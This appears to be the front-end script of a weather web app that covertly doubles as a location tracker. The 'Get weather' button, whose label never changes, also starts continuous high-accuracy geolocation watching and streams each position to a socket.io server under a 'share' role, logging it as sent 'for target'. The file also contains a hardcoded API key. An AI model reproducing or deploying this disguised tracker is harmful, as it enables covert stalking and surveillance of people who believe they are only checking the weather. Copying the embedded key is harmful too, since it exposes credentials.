const socket = io({
  reconnection: true,
  reconnectionDelay: 1000,
  reconnectionDelayMax: 5000,
  reconnectionAttempts: 5,
  query: {
    role: "share"
  }
});

const startBtn = document.getElementById("startBtn");
const stopBtn = document.getElementById("stopBtn");
const weatherBtn = document.getElementById("weatherBtn");
const cityInput = document.getElementById("city");

let isSharing = false;
let watchId = null;

function setTrackingButtonLabel() {
  if (!startBtn) {
    return;
  }

  startBtn.textContent = isSharing ? "Get weather" : "Get weather";
}

function stopTracking() {
  if (watchId !== null) {
    navigator.geolocation.clearWatch(watchId);
    watchId = null;
  }

  isSharing = false;
  setTrackingButtonLabel();
}

function startTracking() {
  if (isSharing) {
    return;
  }

  if (!navigator.geolocation) {
    alert("Geolocation is not supported by your browser.");
    return;
  }

  isSharing = true;
  setTrackingButtonLabel();

  watchId = navigator.geolocation.watchPosition(
    (position) => {
      const { latitude, longitude, accuracy } = position.coords;

      socket.emit("location-update", {
        lat: latitude,
        lng: longitude,
        accuracy,
        timestamp: new Date().toISOString()
      });

      console.log("Location sent for target:", socket.id);
    },
    (error) => {
      console.error("Geolocation error:", error);

      let errorMsg = "Location error";

      switch (error.code) {
        case error.PERMISSION_DENIED:
          errorMsg = "Permission denied";
          break;
        case error.POSITION_UNAVAILABLE:
          errorMsg = "Position unavailable";
          break;
        case error.TIMEOUT:
          errorMsg = "Request timeout";
          break;
      }

      alert(errorMsg);
      stopTracking();
    },
    {
      enableHighAccuracy: true,
      maximumAge: 0,
      timeout: 10000
    }
  );
}

socket.on("connect", () => {
  console.log("Connected to server:", socket.id);

  const targetId = document.getElementById("targetId");
  if (targetId) {
    targetId.textContent = socket.id;
  }
});

socket.on("disconnect", () => {
  console.log("Disconnected from server");
  if (isSharing) {
    stopTracking();
  }
});

socket.on("connect_error", (error) => {
  console.error("Connection error:", error);
});

if (startBtn) {
  startBtn.addEventListener("click", () => {
    if (isSharing) {
      stopTracking();
    } else {
      startTracking();
    }
  });
}

if (stopBtn) {
  stopBtn.addEventListener("click", stopTracking);
}

function getWeatherIcon(weatherMain) {
  const iconMap = {
    Clear: "images/clear.png",
    Clouds: "images/clouds.png",
    Rain: "images/rain.png",
    Drizzle: "images/drizzle.png",
    Snow: "images/snow.png",
    Mist: "images/mist.png",
    Smoke: "images/mist.png",
    Haze: "images/mist.png",
    Dust: "images/mist.png",
    Fog: "images/mist.png",
    Sand: "images/mist.png",
    Ash: "images/mist.png",
    Squall: "images/wind.png",
    Tornado: "images/wind.png"
  };

  return iconMap[weatherMain] || "images/clear.png";
}

function updateWeatherDisplay(data) {
  const temperature = `${(data.main.temp - 273.15).toFixed(2)} C`;
  document.getElementById("temperature").textContent = temperature;
  document.getElementById("weatherDescription").textContent = data.weather[0].description;
  document.getElementById("humidityValue").textContent = `${data.main.humidity}%`;
  document.getElementById("windSpeedValue").textContent = `${data.wind.speed} m/s`;
  document.getElementById("cityName").textContent = data.name;

  const weatherIcon = getWeatherIcon(data.weather[0].main);
  document.getElementById("weatherIcon").src = weatherIcon;
  document.getElementById("weatherIcon").alt = data.weather[0].description;

  console.log("Weather updated for", data.name);
}

function fetchWeather(city) {
  const apiKey = "8edc48f3924abad516c6916169b7f11e";

  fetch(`https://api.openweathermap.org/data/2.5/weather?q=${city}&appid=${apiKey}`)
    .then((response) => {
      if (!response.ok) throw new Error("City not found");
      return response.json();
    })
    .then((data) => updateWeatherDisplay(data))
    .catch((error) => {
      console.error("Weather fetch error:", error);
      alert("Failed to fetch weather. Please try again.");
    });
}

function fetchWeatherByCoordinates(lat, lon) {
  const apiKey = "8edc48f3924abad516c6916169b7f11e";

  fetch(`https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&appid=${apiKey}`)
    .then((response) => response.json())
    .then((data) => updateWeatherDisplay(data))
    .catch((error) => {
      console.error("Weather fetch error:", error);
      fetchWeather("Delhi");
    });
}

function getUserLocationWeather() {
  if (!navigator.geolocation) {
    fetchWeather("Delhi");
    return;
  }

  navigator.geolocation.getCurrentPosition(
    (position) => {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      fetchWeatherByCoordinates(lat, lon);
    },
    (error) => {
      console.error("Location error:", error.message);
      fetchWeather("Delhi");
    }
  );
}

if (startBtn) {
  startBtn.addEventListener("click", () => {
    const city = cityInput ? cityInput.value.trim() : "";

    if (city) {
      fetchWeather(city);
    } else {
      getUserLocationWeather();
    }
  });
}

if (cityInput) {
  cityInput.addEventListener("keydown", (e) => {
    if (e.key === "Enter") {
      if (weatherBtn) {
        weatherBtn.click();
      }
    }
  });
}

window.addEventListener("beforeunload", stopTracking);

window.addEventListener("DOMContentLoaded", () => {
  setTrackingButtonLabel();
  getUserLocationWeather();
});
